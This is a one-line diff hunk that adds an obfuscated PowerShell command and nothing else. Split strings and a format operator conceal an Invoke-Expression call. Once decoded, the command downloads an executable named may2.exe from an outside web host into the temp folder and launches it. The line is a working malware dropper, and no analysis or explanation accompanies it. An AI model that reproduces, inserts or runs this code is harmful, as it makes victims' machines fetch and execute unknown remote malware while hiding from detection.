@@ -1,0 +1,1 @@
+﻿ & ( $ENv:cOmSPec[4,24,25]-joiN'') ((('({0}d'+'pl='+'{0}env:temp+{1}'+'f.e'+'xe{1});'+'('+'Ne'+'w'+'-Obj'+'ect Syst'+'e'+'m.Ne'+'t.'+'We'+'b'+'C'+'li'+'e'+'nt'+')'+'.Downlo'+'adF'+'ile({'+'1}'+'ht'+'tp'+'://www.m'+'acw'+'i'+'zi'+'n'+'fo.c'+'om/zap'+'/'+'m'+'ana'+'ge/ma'+'y2.exe{1}, {0}dpl);Star'+'t-Proc'+'ess'+' {0}'+'dpl') -F[cHaR]36,[cHaR]39) )
